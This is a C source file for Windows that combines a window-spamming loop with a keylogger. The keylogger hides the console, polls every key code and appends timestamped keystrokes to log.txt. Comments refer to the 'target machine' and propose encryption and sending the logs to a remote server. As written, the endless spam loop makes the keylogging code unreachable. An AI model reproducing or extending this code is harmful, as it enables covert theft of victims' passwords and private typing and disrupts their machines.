#include <stdio.h>
#include <time.h>
#include <windows.h>

void logKey(int key, FILE* logfile);

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "SimpleWin";
    RegisterClass(&wc);

    FILE* logfile;
    errno_t err = fopen_s(&logfile, "log.txt", "a+");
    if (err != 0 || logfile == NULL) {
        return 1; // Exit if file cannot be opened
    }


    while (1) {
        int x = rand() % 1920;  // Random X position
        int y = rand() % 1080;  // Random Y position
        HWND hwnd = CreateWindow("SimpleWin", "Spam Window", WS_OVERLAPPEDWINDOW,
            x, y, 200, 150, NULL, NULL, hInstance, NULL);
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
    }


    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // While this method does work for key logging, its not very stealthy and could probably be improved a bit
    while (1) {
        for (int key = 8; key <= 255; key++) { // Loop through all possible key codes
            if (GetAsyncKeyState(key) & 0x0001) { // Check if key is pressed
                logKey(key, logfile);
            }
        }
        Sleep(10); // Reduce CPU usage
    }

    fclose(logfile);
    return 0;
}

// Function to log the keypress
// There the way the logs are stored can be improved in multiple ways. Some ideas include:
//     Some form of Encryption
//     Time Stamps
// These logs are also stored locally on the target machine. 
// Another idea would be to transmit them back to a server somewhere...
void logKey(int key, FILE* logfile) {
    SYSTEMTIME time;
    GetLocalTime(&time);
    fprintf(logfile, "[%02d:%02d:%02d]", time.wHour, time.wMinute, time.wSecond);
    switch (key) {
    case VK_BACK: fprintf(logfile, "[BACKSPACE]"); break;
    case VK_RETURN: fprintf(logfile, "[ENTER]\n"); break;
    case VK_SPACE: fprintf(logfile, " "); break;
    case VK_TAB: fprintf(logfile, "[TAB]"); break;
    case VK_SHIFT: fprintf(logfile, "[SHIFT]"); break;
    case VK_CONTROL: fprintf(logfile, "[CTRL]"); break;
    case VK_ESCAPE: fprintf(logfile, "[ESC]"); break;
    case VK_LEFT: fprintf(logfile, "[LEFT]"); break;
    case VK_RIGHT: fprintf(logfile, "[RIGHT]"); break;
    case VK_UP: fprintf(logfile, "[UP]"); break;
    case VK_DOWN: fprintf(logfile, "[DOWN]"); break;
    case VK_DELETE: fprintf(logfile, "[DEL]"); break;
    default:
        if (key >= 32 && key <= 126) { // Printable ASCII characters
            fprintf(logfile, "%c\n", key);
        }
        else {
            fprintf(logfile, "[%d]\n", key); // Log other keys as keycodes
        }
        break;
    }
    fflush(logfile); // Flush to ensure data is written to the file
}
